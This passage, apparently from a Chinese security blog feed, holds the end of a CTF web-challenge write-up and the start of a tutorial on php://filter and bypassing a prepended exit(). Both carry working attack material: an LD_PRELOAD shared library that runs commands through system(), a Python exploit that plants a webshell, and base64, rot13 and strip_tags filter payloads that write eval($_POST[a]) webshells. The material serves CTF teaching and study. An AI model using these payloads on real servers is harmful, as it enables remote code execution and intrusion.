class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmd)</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">512</span>];<br>  <span class="hljs-built_in">strcpy</span>(buf, cmd);<br>  <span class="hljs-built_in">strcat</span>(buf, <span class="hljs-string">&quot; &gt; /tmp/_0utput.txt&quot;</span>);<br>  system(buf);&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getuid</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> *cmd;<br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>  unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>  <span class="hljs-keyword">if</span> ((cmd = getenv(<span class="hljs-string">&quot;_evilcmd&quot;</span>)) != <span class="hljs-literal">NULL</span>) &#123;<br>    payload(cmd);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc -Wall -fPIC -shared -o evil<span class="hljs-selector-class">.so</span> evil<span class="hljs-selector-class">.c</span> -ldl<br></code></pre></td></tr></table></figure><p>采用 <code>move_uploaded_file</code> 函数进行多文件上传，最后在根目录下找到 <code>getflag</code> 和 <code>flag</code>，访问 <code>/getflag</code> 得到 <code>flag</code></p><p><strong>EXP:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://neepusec.club:18762/index.php&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0&quot;</span>,<br>        <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;data:,123456&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>    &#125;<br>    <span class="hljs-comment"># phpinfo()</span><br>    <span class="hljs-comment"># upload = &quot;neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?%3Chp%20phpipfn(o;)%3E?/resource=w0s1np&quot;</span><br>    <span class="hljs-comment"># ls /</span><br>    <span class="hljs-comment"># upload = &quot;neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?&lt;hp pomevu_lpaoed_difel$(F_LISE&#x27;[veli]&#x27;&#x27;[mt_panem]&#x27;&#x27;,t/pme/iv_lil&#x27;b;)upetvn&#x27;(DLP_EROLDA/=mt/pvelil_bi)&#x27;p;tune(v_\&quot;velimc=dsl/ )\&quot;m;ia(la&#x27;,&#x27;a&#x27;,&#x27;a&#x27;)&#x27;e;hc oifelg_tec_noettn(s/&#x27;mt/p0_tuup.txt&#x27;t;)&gt;?&#x27;);/resource=w0s1np&quot;</span><br>    <span class="hljs-comment"># /getflag</span><br>    upload = <span class="hljs-string">&quot;neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?&lt;hp pomevu_lpaoed_difel$(F_LISE&#x27;[veli]&#x27;&#x27;[mt_panem]&#x27;&#x27;,t/pme/iv_lil&#x27;b;)upetvn&#x27;(DLP_EROLDA/=mt/pvelil_bi)&#x27;p;tune(v_\&quot;velimc=dg/telfga)\&quot;m;ia(la&#x27;,&#x27;a&#x27;,&#x27;a&#x27;)&#x27;e;hc oifelg_tec_noettn(s/&#x27;mt/p0_tuup.txt&#x27;t;)&gt;?/resource=w0s1np&quot;</span><br><br>    res = requests.post(url=url, headers=headers, data=upload)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">require</span>():</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0&quot;</span>,<br>        <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;data:,123456&quot;</span>,<br>    &#125;<br>    require_once = &#123;<span class="hljs-string">&quot;neepu[sec.club&quot;</span>: <span class="hljs-string">&quot;data:,123456/w0s1np&quot;</span>&#125;<br>    files = &#123;<span class="hljs-string">&quot;evil&quot;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./evil.so&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)&#125;<br>    res = requests.post(url=url, headers=headers, data=require_once, files=files)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    upload()<br>    neepu = require()<br></code></pre></td></tr></table></figure><p><code>atao</code>WP如下：</p><p>1.这里利用了 <code>file_get_contents(&#39;php://input&#39;)</code> 方式获取了POST的所有内容，然后去匹配， 如果存在<code>25</code>则结束，但是这里有个缺陷，如果POST上传的形式不是 <code>application/x-www-formurlencoded</code> 而是 <code>multipart/form-data</code> 则获取不到POST请求参数可以绕过这里。</p><p><img src="https://woshilnp.github.io/wzimg/268.png" alt="a"></p><p>2.这里有个 <code>neepu_sec.club</code> <code>POST</code>请求的参数如果直接写的话是不行，不过可以写脚本简单遍历一 下 </p><p><img src="https://woshilnp.github.io/wzimg/269.png" alt="a"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1/ceshi/a.php&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>data = &#123;<br><span class="hljs-string">&#x27;neepu&#x27;</span>+<span class="hljs-built_in">chr</span>(i)+<span class="hljs-string">&#x27;sec&#x27;</span>+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&#x27;club&#x27;</span>:<span class="hljs-number">123</span><br>&#125;<br>res = requests.post(url=url,data=data)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;neepu_sec.club&quot;</span> <span class="hljs-keyword">in</span> res.text:<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;neepu&#x27;</span>+<span class="hljs-built_in">chr</span>(i)+<span class="hljs-string">&#x27;sec&#x27;</span>+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&#x27;club&#x27;</span><br>exit(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#PHP代码:&lt;?var_dump($_POST);?&gt;</span><br></code></pre></td></tr></table></figure><p>3.其实这步就简单了，因为我们已经绕过了第1点的限制了，所以这里变的很简单，可以直接使用编 码绕过 <code>base64</code> 、 <code>string</code> ，使用<code>php</code>伪协议 <code>php://filter</code> ，但是需要写入文件，这里我利用的过滤器 是 <code>string.strip_tags|convert.base64-decode</code> ，最后 <code>resource</code> 配置为 <code>? &gt;PD89ZXZhbCgkX1BPU1RbMV0pOz8+/../21.txt</code> ，这里使用 <code>?&gt;</code> 闭合前面的<code>php</code>代码，则他们都会被 <code>string.strip_tags</code> 过滤器删除，接着 <code>base64</code> 过滤器将剩下的字符进行解码，则获得一句话木马</p><p><img src="https://woshilnp.github.io/wzimg/270.png" alt="a"></p><p>4.这里看似不能用<code>&lt;?</code> 和 <code>php</code> ，但是如果文件是以 <code>&lt;?</code> 开头则可以绕过，而不能用 <code>php</code> 的话，使用短标签 <code>&lt;?=?&gt;</code> 即可</p><p><img src="https://woshilnp.github.io/wzimg/271.png" alt="a"></p><p>接下来是详细步骤，先上传了一句话木马</p><p><img src="https://woshilnp.github.io/wzimg/277.png" alt="a"></p><p>然后去包含它，执行<code>phpinfo()</code>时发现过滤好多函数，看来是要绕过<code>df</code>了</p><p><img src="https://woshilnp.github.io/wzimg/278.png" alt="a"></p><p>然后<code>atao</code>师傅利用了一个绕<code>php7</code>的<code>df</code>文件，将它通过<code>file_put_contents</code>函数写入。</p><p><img src="https://woshilnp.github.io/wzimg/279.png" alt="a"></p><p>访问根目录下，有个<code>getflag</code>的文件，执行就获得<code>flag</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解php://filter以及死亡绕过</title>
    <link href="/2021/05/23/%E8%AF%A6%E8%A7%A3php-filter%E4%BB%A5%E5%8F%8A%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/"/>
    <url>/2021/05/23/%E8%AF%A6%E8%A7%A3php-filter%E4%BB%A5%E5%8F%8A%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="详解php-filter以及死亡绕过"><a href="#详解php-filter以及死亡绕过" class="headerlink" title="详解php://filter以及死亡绕过"></a>详解php://filter以及死亡绕过</h1><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><ul><li>php:// — 访问各个输入/输出流（I/O streams）</li><li>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</li></ul><p><code>php://filter</code> 参数</p><p><code>php://filter</code>可以作为一个中间流来处理其他流。</p><table><thead><tr><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td><td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td><td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file1&#x27;</span>];<br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file2&#x27;</span>];<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$file1</span>);<br>    file_put_contents(<span class="hljs-variable">$file2</span>,<span class="hljs-variable">$txt</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>读取文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 明文读取</span><br>index.php?file1=php:<span class="hljs-comment">//filter/resource=flag.php</span><br><br><span class="hljs-comment"># 编码读取</span><br>index.php?file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p>写入文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 明文写入</span><br>index.php?file2=php:<span class="hljs-comment">//filter/resource=test.txt&amp;txt=helloworld</span><br><br><span class="hljs-comment"># 编码写入</span><br>index.php?file2=php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=test.txt&amp;txt=helloworld</span><br></code></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><h3 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h3><p><code>string.rot13</code></p><p><code>string.rot13</code>（自 PHP 4.3.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.str-rot13.php">str_rot13()</a>函数处理所有的流数据。</p><p><code>str_rot13</code>—对字符串执行<code>ROT13</code>转换. <code>ROT13</code>编码简单地使用字母表中后面第<code>13</code>个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p><p><code>string.toupper</code></p><p><code>string.tolower</code>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>函数处理所有的流数据。</p><p><code>strtoupper</code>—将字符串转化为大写</p><p><code>string.tolower</code></p><p>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>函数处理所有的流数据。</p><p><code>strtolower</code>—将字符串转化为小写</p><h3 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h3><p>使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a>函数处理所有的流数据。可以用两种格式接收参数：一种是和<code>strip_tags()</code>函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p><p><code>strip_tags</code>—从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串<code>str</code>去除空字符、HTML 和 PHP 标记后的结果。它使用与函数<code>fgetss()</code>一样的机制去除标记。</p><h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><p>如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。对于指定过滤器的更多信息，请参考该函数的手册页。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.php.net<span class="hljs-regexp">/manual/</span>zh/filters.convert.php<br></code></pre></td></tr></table></figure><h4 id="convert-base64"><a href="#convert-base64" class="headerlink" title="convert.base64"></a>convert.base64</h4><p><code>convert.base64-encode</code>和 <code>convert.base64-decode</code>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。<code>convert.base64-encode</code>支持以一个关联数组给出的参数。如果给出了<code>line-length</code>，base64 输出将被用<code>line-length</code>个字符为 长度而截成块。如果给出了<code>line-break-chars</code>，每块将被用给出的字符隔开。这些参数的效果和用<code>base64_encode()</code>再加上 chunk_split()相同。</p><h4 id="convert-quoted"><a href="#convert-quoted" class="headerlink" title="convert.quoted"></a>convert.quoted</h4><p><code>convert.quoted-printable-encode</code>和<code>convert.quoted-printable-decode</code>使用此过滤器的<code>decode</code>版本等同于用 <code>quoted_printable_decode()</code>函数处理所有的流数据。没有和<code>convert.quoted-printable-encode</code>相对应的函数。<code> convert.quoted-printable-encode</code>支持以一个关联数组给出的参数。除了支持和<code>convert.base64-encode</code>一样的附加参数外，<code>convert.quoted-printable-encode</code>还支持布尔参数<code>binary和 force-encode-first</code>。<code>convert.base64-decode</code>只支持<code>line-break-chars</code>参数作为从编码载荷中剥离的类型提示。</p><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><p>这个过滤器需要<code>php</code>支持 <code>iconv</code> ，而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p><p><code>iconv</code> — 字符串按要求的字符编码来转换</p><p>convery.iconv.*的使用有两种方法:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">convert.iconv.&lt;<span class="hljs-keyword">input</span>-<span class="hljs-keyword">encoding</span>&gt;.&lt;output-<span class="hljs-keyword">encoding</span>&gt; <br><span class="hljs-keyword">or</span> <br>convert.iconv.&lt;<span class="hljs-keyword">input</span>-<span class="hljs-keyword">encoding</span>&gt;/&lt;output-<span class="hljs-keyword">encoding</span>&gt;<br></code></pre></td></tr></table></figure><p>支持的字符编码有一下几种（详细参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br><span class="hljs-attribute">UTF7</span>-IMAP<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br><span class="hljs-attribute">ASCII</span>*<br></code></pre></td></tr></table></figure><h3 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h3><p>虽然 <a href="https://www.php.net/manual/zh/wrappers.compression.php">压缩封装协议</a> 提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Note</span>: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 <br><br><span class="hljs-attribute">zlib</span>.* 压缩过滤器自 PHP 版本 <span class="hljs-number">5</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>起可用，在激活 zlib的前提下。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.x版中使用。此过滤器在 PHP <span class="hljs-number">4</span> 中 不可用。<br></code></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">compress</span>.zlib:<span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure><h3 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h3><p><code>mcrypt.</code>*和 <code>mdecrypt.*</code>使用<code>libmcrypt</code>提供了对称的加密和解密。这两组过滤器都支持<code>mcrypt</code>扩展库中相同的算法，格式为 <code>mcrypt.ciphername</code>，其中<code>ciphername</code>是密码的名字，将被传递给<code>mcrypt_module_open()</code>。有以下五个过滤器参数可用：</p><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/248.png?raw=true" alt="a"></p><h2 id="绕过死亡exit"><a href="#绕过死亡exit" class="headerlink" title="绕过死亡exit"></a>绕过死亡exit</h2><h3 id="bypass不同变量"><a href="#bypass不同变量" class="headerlink" title="bypass不同变量"></a>bypass不同变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>file_put_contents(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。那么这种情况下，如何绕过这个<code>“死亡exit”</code>？</p><p>思路其实也很简单我们只要将<code>content</code>前面的那部分内容使用某种手段（编码等）进行处理，导致<code>php</code>不能识别该部分就可以了。</p><p>这里的<code>$_POST[‘filename’]</code>是可以控制协议的.</p><h4 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h4><p><code>Base64</code>编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p><p><code>base64</code>编码中只包含64个可打印字符，而PHP在解码<code>base64</code>时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</p><p>当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用<code>php://filter/write=convert.base64-decode</code>来首先对其解码。在解码的过程中，字符<code>&lt; ? ; &gt; </code>空格等一共有7个字符不符合<code>base64</code>编码的字符范围将被忽略，所以最终被解码的字符仅有<code>”phpexit”</code>和我们传入的其他字符。</p><p>由于，<code>”phpexit”</code>一共7个字符，但是<code>base64</code>算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符。这样前边的<code>phpexit</code>加上另一个字符就会被<code>base64</code>解码，然后后边的我们精心构造的<code>base64</code>字符串也会被成功解码为php代码。</p><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=<span class="hljs-number">1</span>.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==<br></code></pre></td></tr></table></figure><p>成功写入</p><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/249.png?raw=true" alt="a"></p><h4 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h4><p><code>str_rot13</code>—对字符串执行<code>ROT13</code>转换. <code>ROT13</code>编码简单地使用字母表中后面第<code>13</code>个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p><p>利用<code>php://filter</code>中<code>string.rot13</code>过滤器去除<code>”exit”</code>。<code>string.rot13</code>的特性是编码和解码都是自身完成，利用这一特性可以去除<code>exit</code>。 <code>&lt;?php exit;?&gt;</code> 在经过<code>rot13</code>编码后会变成 <code>&lt;?cuc rkvg();?&gt;</code> ，不过这种利用手法的前提是PHP不开启<code>short_open_tag/</code></p><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/250.png?raw=true" alt="a"></p><p>虽然官方说的默认开启，但是在<code>php.ini</code>中默认是注释掉的，也就是说它还是默认关闭。</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/write=string.rot13/resource=2.php&amp;content=<span class="hljs-meta">&lt;?</span>cuc riny($_CBFG[n]);</span><br></code></pre></td></tr></table></figure><p>成功写入文件 2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>cuc rkvg();<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<br></code></pre></td></tr></table></figure><h4 id="string-strip-tags-1"><a href="#string-strip-tags-1" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h4><p><code>strip_tags</code>— 从字符串中去除 HTML 和 PHP 标记。该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数<code>fgetss()</code>一样的机制去除标记。</p><p><img src="https://github.com/woshilnp/woshilnp.github.io/blob/master/wzimg/251.png?raw=true" alt="a"></p><p>但是我们的目的是写入<code>webshell</code>，如果那样的话，我们的<code>webshell</code>岂不是同样起不了作用，不过我们可以使用多个过滤器进行绕过这个限制（<code>php://filter</code>允许通过使用多个过滤器）。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>、webshell用base64编码   <span class="hljs-regexp">//</span>为了避免strip_tags的影响<br><br><span class="hljs-number">2</span>、调用string.strip_tags <span class="hljs-regexp">//</span>这一步将去除&lt;?php <span class="hljs-keyword">exit</span>; ?&gt;<br><br><span class="hljs-number">3</span>、调用convert.base64-decode <span class="hljs-regexp">//</span>这一步将还原base64编码的webshell<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=<span class="hljs-meta">?&gt;</span>PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span><br></code></pre></td></tr></table></figure><p>成功写入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<br></code></pre></td></tr></table></figure><h4 id="htaccess的预包含处理"><a href="#htaccess的预包含处理" class="headerlink" title=".htaccess的预包含处理"></a>.htaccess的预包含处理</h4><p>PHP中<code>auto_prepend_file</code>与<code>auto_append_file</code>用法实例分析：</p><p><code>php.ini</code>中有两项：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file 在页面顶部加载文件<br><span class="hljs-built_in">auto</span>_append_file 